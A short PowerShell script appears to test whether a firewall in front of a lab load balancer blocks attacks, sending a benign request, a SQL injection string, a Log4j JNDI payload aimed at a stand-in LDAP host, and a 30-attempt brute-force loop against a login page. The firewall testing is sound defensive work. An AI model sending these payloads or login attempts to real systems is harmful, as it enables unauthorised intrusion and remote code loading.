# Run in PowerShell. Replace the placeholder with the AlbDnsName output of the stack.
$base = "http://<ALB_DNS>"

# 1. Benign request
try { (Invoke-WebRequest -Uri "$base/search?q=cabinet" -UseBasicParsing).StatusCode } catch { $_.Exception.Response.StatusCode.value__ }

# 2. SQL injection
try { (Invoke-WebRequest -Uri ($base + "/search?q=" + [uri]::EscapeDataString("' OR 1=1 --")) -UseBasicParsing).StatusCode } catch { $_.Exception.Response.StatusCode.value__ }

# 3. Log4j payload
try { (Invoke-WebRequest -Uri ($base + "/search?q=" + [uri]::EscapeDataString('${jndi:ldap://x.y}')) -UseBasicParsing).StatusCode } catch { $_.Exception.Response.StatusCode.value__ }

# 4. Brute force on /login (wrong credentials, lab use only)
1..30 | ForEach-Object {
  try { (Invoke-WebRequest -Uri "$base/login" -Method POST -Body @{user="docteur"; password="wrong$_"} -UseBasicParsing).StatusCode }
  catch { $_.Exception.Response.StatusCode.value__ }
}
